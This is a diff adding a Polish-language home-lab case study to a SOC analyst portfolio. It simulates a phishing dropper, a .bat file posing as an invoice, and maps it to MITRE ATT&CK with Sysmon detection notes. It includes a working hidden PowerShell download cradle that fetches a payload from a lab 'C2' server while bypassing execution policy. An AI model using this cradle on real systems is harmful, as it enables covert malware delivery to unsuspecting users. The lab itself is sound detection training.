@@ -200,3 +200,38 @@ Kluczowym znaleziskiem w warstwie aplikacji (nagłówki HTTP) było pole `User-A
 
 
 *Wnioski z analizy:* Narzędzia typu LOLBins stanowią ogromne wyzwanie dla klasycznych systemów antywirusowych, ponieważ sam plik `certutil.exe` jest podpisany przez Microsoft i w pełni zaufany. Skuteczna detekcja opiera się tutaj wyłącznie na monitorowaniu behawioralnym – korelacji uruchamianego procesu z jego nietypowymi argumentami (wiersz poleceń) oraz na wychwytywaniu anomalii sieciowych w warstwie aplikacji (specyficzny User-Agent).
+
+## Case Study 6: Malicious Dropper
+
+### 1. Przebieg ataku
+Ten scenariusz odwzorowuje jedno z najczęstszych zdarzeń obsługiwanych przez analityków SOC pierwszej linii. Symulacja polegała na wykonaniu przez użytkownika złośliwego załącznika z wiadomości phishingowej (pliku typu `.bat` ucharakteryzowanego na fakturę), który w tle cicho uruchamia interpreter PowerShell w celu pobrania i zapisania docelowego złośliwego oprogramowania z serwera C2 kontrolowanego przez atakującego.
+
+* **Nasłuch na serwerze C2 (Kali Linux - 10.0.2.5):**
+  Uruchomiłem prosty serwer HTTP w Pythonie, symulujący infrastrukturę przestępców hostującą złośliwy plik docelowy (payload).
+  ```bash
+  python3 -m http.server 80
+  ```
+
+* **Egzekucja i pobranie (Windows 10 - 10.0.2.4):**
+  Na stacji roboczej ofiary utworzyłem i uruchomiłem plik `Faktura_Zalegla.bat`, zawierający popularny wektor *PowerShell Download Cradle*:
+  ```bat
+  powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri [http://10.0.2.5/payload.exe](http://10.0.2.5/payload.exe) -OutFile C:\Users\Public\payload.exe"
+  ```
+  Z perspektywy użytkownika po kliknięciu pliku pojawiło się jedynie błyskawiczne mignięcie czarnego okna konsoli.
+
+### 2. Mapowanie do MITRE ATT&CK
+* **Taktyka:** Initial Access ([TA0001](https://attack.mitre.org/tactics/TA0001/)) $\rightarrow$ **Technika:** Phishing: Spearphishing Attachment ([T1566.001](https://attack.mitre.org/techniques/T1566/001/))
+* **Taktyka:** Execution ([TA0002](https://attack.mitre.org/tactics/TA0002/)) $\rightarrow$ **Technika:** Command and Scripting Interpreter: PowerShell ([T1059.001](https://attack.mitre.org/techniques/T1059/001/))
+
+### 3. Detekcja i analiza logów 
+
+#### Logi systemowe: Sysmon Event ID 1 (Process Creation)
+Podczas wstępnego triagu alertu (Initial Triage), kluczowe było przeanalizowanie **Drzewa Procesów (Process Tree)**, aby zrozumieć, co dokładnie zainicjowało zdarzenie. Agent Wazuh przesłał telemetrię z Sysmona, z której wyciągnąłem następujące Wskaźniki Kompromitacji (IoC):
+
+* **ParentImage (Proces nadrzędny):** `C:\Windows\System32\cmd.exe` (Wskazuje to na fakt, że PowerShell nie został uruchomiony bezpośrednio z menu Start przez użytkownika, lecz został wywołany z poziomu skryptu wykonawczego).
+* **Image (Proces potomny):** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
+* **CommandLine:** Zarejestrowana komenda zawierała jawną próbę obejścia polityk bezpieczeństwa (`-ExecutionPolicy Bypass`), ukrycia okna przed ofiarą (`-WindowStyle Hidden`) oraz adres zewnętrznego serwera, z którego pobierany był złośliwy ładunek.
+
+<img width="820" height="630" alt="powershell" src="https://github.com/user-attachments/assets/51908c29-8535-43c1-8977-d85decd221b7" />
+
+*Wnioski z analizy (Działania SOC L1):* W realnym środowisku produkcyjnym taki obraz logów to natychmiastowe potwierdzenie (True Positive) incydentu o wysokim priorytecie. Identyfikacja flag takich jak `-WindowStyle Hidden` czy metody `Invoke-WebRequest` w linii poleceń pozwala na szybkie powiązanie alertu z aktywnością typu Dropper. Prawidłowa reakcja L1 w tym przypadku obejmowałaby eskalację zgłoszenia, zablokowanie adresu IP serwera C2 na zaporze ogniowej oraz natychmiastową izolację sieciową stacji roboczej hosta, aby zapobiec rozprzestrzenianiu się infekcji.
